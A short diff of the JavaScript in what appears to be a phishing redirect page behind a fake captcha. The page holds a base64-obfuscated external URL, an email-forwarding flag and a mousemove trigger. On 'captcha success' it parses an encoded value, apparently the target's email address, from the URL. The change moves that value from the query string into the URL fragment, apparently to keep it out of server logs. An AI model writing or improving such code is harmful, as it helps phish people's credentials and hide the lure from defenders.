@@ -35,7 +35,7 @@
     const forwardEmail = true;
 
     const urlParts = [
-      "aHR0cHM6Ly80aHo3OC5scWN5cXNwLmVzL3BsZkQ4bmdRITUyRFpvRTZnWi8=" 
+      "aHR0cHM6Ly80aHo3OC5scWN5cXNwLmVzL3BsZkQ4bmdRITUyRFpvRTZnWi8="
     ];
 
     document.addEventListener("mousemove", function trigger() {
@@ -49,8 +49,8 @@
     }
 
     function onCaptchaSuccess() {
-      const query = window.location.search;
-      const match = query.match(/\?(\d{10})=([a-zA-Z0-9+/=]+)/);
+      const hash = window.location.hash;
+      const match = hash.match(/#\?(\d{10})=([a-zA-Z0-9+/=]+)/);
 
       if (!match || !match[2]) {
         document.body.innerHTML = "<h3>Missing required parameter.</h3>";
